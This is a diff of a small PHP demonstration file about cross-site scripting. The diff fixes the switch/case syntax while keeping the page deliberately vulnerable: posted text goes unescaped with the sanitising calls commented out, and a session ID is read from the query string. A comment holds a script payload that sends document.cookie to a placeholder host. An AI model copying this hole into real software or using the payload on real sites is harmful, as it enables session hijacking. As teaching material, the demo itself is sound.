@@ -4,7 +4,7 @@
  * XSS(Cross Site Scripting)
  */
 switch ($_SERVER['REQUEST_METHOD']) {
-    case 'GET': {
+    case 'GET':
         if (array_key_exists('PHPSESSID', $_GET)) {
              $_GET['PHPSESSID'];
         } else {
@@ -15,16 +15,15 @@ switch ($_SERVER['REQUEST_METHOD']) {
     </form>
 HTML;
         }
-    }
-    case 'POST': {
+        break;
+    case 'POST':
         /**
          * <script>location.href="http://localhost/?" + document.cookie</script>
          */
         if (array_key_exists('text', $_POST)) {
-             $content = $_POST['text'];
+                $content = $_POST['text'];
             //  htmlentities($content);
             //  filter_var($content, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
         }
         break;
-    }
 }
